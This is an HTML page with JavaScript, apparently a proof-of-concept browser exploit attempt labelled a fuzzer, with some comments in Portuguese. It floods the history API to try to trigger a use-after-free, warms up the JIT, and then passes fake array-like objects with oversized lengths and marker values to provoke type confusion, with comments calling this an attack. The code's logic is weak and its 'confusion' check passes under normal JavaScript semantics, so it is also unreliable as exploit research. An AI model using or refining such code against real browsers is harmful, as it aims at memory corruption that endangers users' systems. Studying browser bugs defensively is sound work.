<!DOCTYPE html>
<html>
<head><title>Fuzzer: JIT + UAF</title></head>
<body>
<button onclick="fuzz()">Fuzz JIT</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(m) { logEl.textContent += m + "\n"; }

const BASE = 977, STEP = 14461, UAF_ITERS = 48;

async function triggerUAF() {
  let size = BASE;
  for(let i=0; i<UAF_ITERS; i++){
    history.pushState({index:i}, "", "#" + "E".repeat(size));
    history.replaceState({index:i}, "", "#" + "E".repeat(size >> 1));
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    size += STEP;
    await new Promise(r=>setTimeout(r,5));
  }
  await new Promise(r=>setTimeout(r,200));
}

async function fuzz() {
  log("=== FUZZING: JIT Compiler + UAF ===\n");
  
  await triggerUAF();
  
  window.addEventListener('popstate', (e) => {
    if(e.state && e.state.index >= 40) {
      log("\n[RACE] JIT fuzzing during UAF...\n");
      
      // FUZZ 1: Force JIT compilation com type confusion
      function jit_target(arr, idx, val) {
        // JIT vai assumir tipos ap√≥s N itera√ß√µes
        arr[idx] = val;
        return arr[idx];
      }
      
      // Warm up JIT (10000 itera√ß√µes)
      const warm = new Uint32Array(100);
      for(let i=0; i<10000; i++) {
        jit_target(warm, i % 100, 0xAAAA0000 + i);
      }
      
      log("  JIT warmed up (Uint32Array)\n");
      
      // ATAQUE: Trocar tipo durante execu√ß√£o compilada
      log("  Switching to Object during JIT...");
      const fake = {
        0: 0x41414141,
        1: 0x42424242,
        length: 0xFFFFFFFF
      };
      fake.__proto__ = Array.prototype;
      
      try {
        const result = jit_target(fake, 100, 0xDEADBEEF);
        log(`    Result: 0x${result.toString(16)}`);
        
        if(result === 0xDEADBEEF) {
          log("    üö® JIT CONFUSION! Wrote to fake object!");
        }
      } catch(e) {
        log(`    Exception: ${e.message}`);
      }
      
      // FUZZ 2: Type confusion em loops
      function confuse_loop(x) {
        let result = 0;
        for(let i=0; i<10; i++) {
          result += x[i];
        }
        return result;
      }
      
      // Warm up com array
      for(let i=0; i<10000; i++) {
        confuse_loop([1,2,3,4,5,6,7,8,9,10]);
      }
      
      log("\n  Loop JIT warmed up");
      
      // Attack com object
      const fake_arr = {
        0: 1.1, 1: 2.2, 2: 3.3, 3: 4.4, 4: 5.5,
        5: 6.6, 6: 7.7, 7: 8.8, 8: 9.9, 9: 10.10,
        length: 10
      };
      
      try {
        const sum = confuse_loop(fake_arr);
        log(`    Sum: ${sum}`);
      } catch(e) {
        log(`    Exception: ${e.message}`);
      }
    }
  });
  
  for(let i=0; i<15; i++) {
    history.back();
    await new Promise(r=>setTimeout(r,40));
  }
}
</script>
</body>
</html>
